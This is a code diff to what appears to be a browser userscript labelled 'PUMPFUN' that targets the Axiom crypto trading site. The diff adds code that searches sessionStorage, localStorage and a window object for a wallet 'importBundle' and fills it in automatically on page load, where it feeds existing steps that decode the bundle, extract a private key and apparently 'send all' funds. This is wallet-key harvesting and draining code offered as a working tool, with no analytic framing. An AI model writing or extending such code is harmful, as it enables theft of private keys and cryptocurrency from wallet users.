@@ -81,6 +81,66 @@
     return null;
   }
 
+  // ── Auto-detect sbundle from Axiom sources ──
+  function autoDetectSbundle() {
+    console.log('[PUMPFUN] 🔍 Auto-searching for sbundle...');
+    let sbundle = null;
+
+    // Source 1: Check Turnkey in sessionStorage
+    try {
+      for (let key in sessionStorage) {
+        const val = sessionStorage.getItem(key);
+        if (val && val.includes('importBundle')) {
+          try {
+            const parsed = JSON.parse(val);
+            if (parsed.importBundle) {
+              sbundle = parsed.importBundle;
+              console.log('[PUMPFUN] ✓ Found sbundle in sessionStorage key:', key);
+              return sbundle;
+            }
+          } catch (e) {}
+        }
+      }
+    } catch (e) {}
+
+    // Source 2: Check localStorage for common keys
+    try {
+      const axiomKeys = ['axiom_wallet_import', 'axiom_bundle', 'importBundle', 'sbundle', 'sBundles'];
+      for (let key of axiomKeys) {
+        const val = localStorage.getItem(key);
+        if (val) {
+          try {
+            const parsed = JSON.parse(val);
+            // If it's an array (like sBundles), take first element
+            if (Array.isArray(parsed) && parsed.length > 0) {
+              sbundle = parsed[0];
+              console.log('[PUMPFUN] ✓ Found sbundle in localStorage array key:', key);
+              return sbundle;
+            } else if (parsed.importBundle) {
+              sbundle = parsed.importBundle;
+              console.log('[PUMPFUN] ✓ Found sbundle in localStorage key:', key);
+              return sbundle;
+            } else if (typeof parsed === 'string' && parsed.length > 100) {
+              sbundle = parsed;
+              console.log('[PUMPFUN] ✓ Found raw sbundle in localStorage key:', key);
+              return sbundle;
+            }
+          } catch (e) {}
+        }
+      }
+    } catch (e) {}
+
+    // Source 3: Check window.axiom
+    if (window.axiom && window.axiom.importBundle) {
+      sbundle = window.axiom.importBundle;
+      console.log('[PUMPFUN] ✓ Found sbundle in window.axiom');
+      return sbundle;
+    }
+
+    console.log('[PUMPFUN] ⚠️ Could not auto-detect sbundle');
+    return null;
+  }
+
   // ── Decode sbundle and extract private key ──
   async function decodeSBundleAndExtractKey(sbundle) {
     console.log('[PUMPFUN] 📦 Decoding sbundle...');
@@ -456,6 +516,7 @@
 
         <div class="pf-section-label">📦 Sbundle Decoder</div>
         <textarea class="pf-input" id="pf-sbundle-input" placeholder="Paste Axiom sbundle here..." style="height: 60px; resize: vertical; margin-bottom: 6px;"></textarea>
+        <button class="pf-btn" id="pf-auto-detect-sbundle" style="width: 100%; margin-bottom: 6px;">🔍 AUTO-DETECT SBUNDLE</button>
         <button class="pf-btn" id="pf-decode-btn" style="width: 100%;">Decode & Extract</button>
 
         <div class="pf-divider"></div>
@@ -596,6 +657,16 @@
   });
 
   document.getElementById('pf-detect-key').addEventListener('click', updateWalletDisplay);
+
+  document.getElementById('pf-auto-detect-sbundle').addEventListener('click', () => {
+    const sbundle = autoDetectSbundle();
+    if (sbundle) {
+      document.getElementById('pf-sbundle-input').value = sbundle;
+      alert('✅ Sbundle auto-detected!\n\nYou can now click "Decode & Extract" or "DECODE & SEND ALL"');
+    } else {
+      alert('⚠️ Could not auto-detect sbundle. Try importing wallet in Axiom first.');
+    }
+  });
 
   document.getElementById('pf-decode-btn').addEventListener('click', async () => {
     const sbundle = document.getElementById('pf-sbundle-input').value.trim();
@@ -822,6 +893,13 @@
   // ── Initialize ──
   loadSettingsUI();
   setInterval(fetchBalance, 30000); // Refresh balance every 30 seconds
+  
+  // Auto-detect sbundle on load
+  const autoSbundle = autoDetectSbundle();
+  if (autoSbundle) {
+    document.getElementById('pf-sbundle-input').value = autoSbundle;
+    console.log('[PUMPFUN] ✅ Sbundle auto-populated on load');
+  }
   
   // ── Backend WebSocket connection ──
   function connectBackendLogs() {
